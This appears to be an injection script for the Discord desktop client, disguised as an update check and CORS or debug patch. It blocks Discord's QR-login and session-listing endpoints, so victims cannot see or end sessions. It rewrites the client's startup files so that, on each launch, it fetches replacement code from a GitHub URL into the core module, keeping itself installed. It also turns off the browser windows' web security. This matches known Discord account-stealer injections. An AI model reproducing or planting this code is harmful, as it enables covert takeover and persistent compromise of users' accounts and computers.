const { session } = require('electron');
const fs = require('fs');
const args = process.argv;
const path = require('path');

const CONFIG = {
    filters: {
        urls: [
            'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
            'https://*.discord.com/api/v*/applications/detectable',
            'https://discord.com/api/v*/applications/detectable',
            'https://*.discord.com/api/v*/users/@me/library',
            'https://discord.com/api/v*/users/@me/library',
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
}

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

async function updateCheck() {
    const { resourcePath, app } = discordPath;
    if (resourcePath === undefined || app === undefined) return;

    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');

    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0];
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;

    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');

    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                name: 'discord',
                main: 'index.js',
            }, null, 4),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      https.get('https://raw.githubusercontent.com/Entity378/CORS-enabler-for-Discord/refs/heads/main/index.js', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
      
      }).on("error", (err) => {
          setTimeout(init(), 10000);
      });
  }
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;

        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

let checkUpdate = true;
session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    });

    if(checkUpdate == true)
    {
        checkUpdate = false;
        updateCheck()
    }
});

module.exports = require('./core.asar');

const electron = require('electron');
const originalBrowserWindow = electron.BrowserWindow;

function patchedBrowserWindow(options) {
    options = options || {};
    options.webPreferences = options.webPreferences || {};
    options.webPreferences.webSecurity = false;
    options.webPreferences.allowRunningInsecureContent = true;
    console.log('[Debug Patch] BrowserWindow creata con webPreferences:', options.webPreferences);

    const win = new originalBrowserWindow(options);
    return win;
}

Object.setPrototypeOf(patchedBrowserWindow, originalBrowserWindow);
patchedBrowserWindow.prototype = originalBrowserWindow.prototype;

electron.BrowserWindow = patchedBrowserWindow;
